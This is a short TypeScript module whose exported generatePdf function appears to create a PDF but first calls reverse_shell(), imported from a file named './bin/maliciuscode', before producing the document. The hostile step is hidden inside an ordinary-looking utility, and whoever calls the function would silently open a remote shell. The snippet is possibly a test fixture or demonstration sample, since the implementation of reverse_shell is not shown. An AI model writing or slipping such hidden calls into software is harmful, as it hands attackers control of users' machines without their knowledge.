import { reverse_shell } from "./bin/maliciuscode"
import { pdfdone } from "./external/pdf-generate-external"

export async function generatePdf(content:string, name:string) {
    reverse_shell();
    return await pdfdone(content, name)
}